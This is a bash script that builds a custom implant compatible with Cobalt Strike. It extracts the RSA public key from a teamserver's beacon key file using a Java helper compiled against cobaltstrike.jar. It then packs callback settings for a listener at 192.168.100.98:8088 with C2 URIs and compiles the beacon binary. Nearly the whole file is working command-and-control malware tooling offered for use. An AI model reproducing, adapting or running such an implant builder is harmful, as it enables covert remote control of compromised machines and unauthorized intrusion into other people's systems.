#!/bin/bash
# Fix metadata.c outlen error + rebuild + optional gen_payload for 192.168.100.98:8088
set -e
ROOT="$(cd "$(dirname "$0")/.." && pwd)"
cd "$ROOT"

# 1) Fix compile error if still present
if grep -q 'outlen = 256;' implant/src/metadata.c; then
  sed -i '/outlen = 256;/d' implant/src/metadata.c
  echo "[+] removed orphan outlen = 256;"
else
  echo "[=] metadata.c already fixed"
fi

# 2) Prefer keys from teamserver CWD (must match running TS)
KEYS=""
for p in \
  "$ROOT/../.cobaltstrike.beacon_keys" \
  "$ROOT/../../.cobaltstrike.beacon_keys" \
  "$HOME/4.5/.cobaltstrike.beacon_keys" \
  "./.cobaltstrike.beacon_keys" \
  "../.cobaltstrike.beacon_keys"
do
  if [ -f "$p" ]; then KEYS="$p"; break; fi
done

if [ -n "$KEYS" ] && [ -f "$ROOT/../4.5/lib/cobaltstrike.jar" ] || [ -f "$ROOT/../../4.5/lib/cobaltstrike.jar" ]; then
  JAR=$(ls "$ROOT"/../4.5/lib/cobaltstrike.jar "$ROOT"/../../4.5/lib/cobaltstrike.jar 2>/dev/null | head -1)
  echo "[*] keys=$KEYS jar=$JAR"
  cat > /tmp/DumpKeys.java <<'JAVA'
import java.io.File;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.security.KeyPair;
import common.CommonUtils;
public class DumpKeys {
  public static void main(String[] a) throws Exception {
    KeyPair kp = (KeyPair) CommonUtils.readObject(new File(a[0]), null);
    byte[] pub = kp.getPublic().getEncoded();
    Files.write(Paths.get(a[1]), pub);
    System.out.println("wrote " + a[1] + " len=" + pub.length);
  }
}
JAVA
  javac -cp "$JAR" -d /tmp /tmp/DumpKeys.java
  java -cp "/tmp:$JAR" DumpKeys "$KEYS" "$ROOT/tools/fixtures/publickey.der"
elif [ -f "$ROOT/tools/fixtures/publickey.der" ]; then
  echo "[!] using existing publickey.der — ensure it matches RUNNING teamserver keys"
else
  echo "[!] no publickey.der — export from teamserver .cobaltstrike.beacon_keys first"
  exit 1
fi

# 3) Pack settings for your listener
python3 tools/pack_settings.py \
  --host 192.168.100.98 --port 8088 --https 0 \
  --pubkey tools/fixtures/publickey.der \
  --out tools/fixtures/settings.bin \
  --sleep 5000 --jitter 0 \
  --get-uri "/en_US/all.js" --post-uri "/submit.php"
python3 tools/insert_blob.py tools/fixtures/settings.bin implant/src/settings_blob.inc

# 4) Build
make -C implant clean
make -C implant OUTPUT=beacon debug
echo "[+] binary: implant/bin/beacon"
echo "[*] run: ./implant/bin/beacon"
echo "[*] CS client Beacons tab should show a new session if RSA key matches TS"
